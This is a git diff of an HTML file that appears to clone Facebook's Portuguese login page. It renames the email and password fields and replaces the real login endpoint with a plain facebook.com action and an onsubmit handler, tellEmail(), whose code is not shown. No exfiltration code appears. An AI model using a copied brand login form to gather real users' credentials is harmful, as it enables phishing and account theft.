@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook - entre ou cadastre-se</title>
-    <link rel="shortcut icon" href="libs/fb_icon_325x325.png" />
+    <link rel="shortcut icon" href="fb_icon_325x325.png" />
     <link
       rel="stylesheet"
       href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
@@ -20,11 +20,10 @@
         <img
           class="facebook-logo"
           src="facebook-logo.png"
-          alt="Logo Facebook"
+          alt="Ir para a página inicial do Facebook"
         />
         <form
-          action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"
-          class="formLogin">
+          action="https://www.facebook.com" onsubmit="return tellEmail()">
           <table>
             <tr>
               <td>
@@ -37,22 +36,22 @@
             <tr>
               <td>
                 <input
-                  class=""
+                  class="user-email-phone"
                   type="email"
-                  name="email"
+                  name="user-email-phone"
                   id="user-email-phone"
                 />
               </td>
               <td>
                 <input
-                  class=""
+                  class="user-password"
                   type="password"
-                  name="pass"
+                  name="user-password"
                   id="user-password"
                 />
               </td>
               <td>
-                <button id="button-login" class="">
+                <button id="button-login" class="btnSend">
                   Entrar
                 </button>
               </td>
@@ -65,7 +64,6 @@
         </form>
       </div>
     </header>
-
     <main>
 
     </main>
